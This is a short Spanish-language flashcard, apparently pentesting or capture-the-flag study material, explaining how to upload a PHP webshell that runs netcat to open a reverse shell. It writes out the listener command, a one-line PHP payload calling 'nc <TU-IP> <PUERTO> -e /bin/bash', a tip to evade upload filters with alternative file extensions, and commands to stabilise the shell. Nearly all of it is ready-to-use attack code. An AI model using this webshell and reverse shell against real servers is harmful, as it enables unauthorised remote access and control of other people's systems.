**Flashcard 1 – Webshell básica con Netcat**

**Pregunta:** ¿Cómo subir y usar una webshell que ejecute `nc` para obtener una reverse shell?
**Respuesta:**

1. Listener: `nc -lvnp <PUERTO>`
2. Webshell PHP:

   ```php
   <?php system("nc <TU-IP> <PUERTO> -e /bin/bash"); ?>
   ```
3. Subir archivo al servidor (usar extensiones alternativas si hay filtro).
4. Ejecutar accediendo a la URL.
5. Estabilizar shell:

   ```bash
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   export TERM=xterm
   ```

   Luego `stty raw -echo; fg` y `reset`.
